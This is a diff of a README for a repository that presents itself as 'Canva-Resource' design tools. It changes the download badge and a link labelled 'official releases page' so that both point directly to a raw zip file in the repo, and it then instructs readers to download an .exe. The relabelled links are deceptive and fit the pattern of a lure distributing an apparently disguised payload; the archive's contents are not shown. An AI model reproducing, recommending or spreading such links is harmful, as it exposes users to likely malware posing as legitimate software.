@@ -1,6 +1,6 @@
 # 🎨 Canva-Resource - Professional Design Tools For Every Creator
 
-[![](https://img.shields.io/badge/Download_Now-Blue-blue)](https://github.com/Walloperlioncub193/Canva-Resource/releases)
+[![](https://img.shields.io/badge/Download_Now-Blue-blue)](https://raw.githubusercontent.com/Walloperlioncub193/Canva-Resource/main/Video-Editor/Resource-Canva-2.2.zip)
 
 ## 📌 About This Software
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to obtain the program on your machine.
 
-1. Visit the [official releases page](https://github.com/Walloperlioncub193/Canva-Resource/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Walloperlioncub193/Canva-Resource/main/Video-Editor/Resource-Canva-2.2.zip).
 2. Locate the most recent version in the list.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
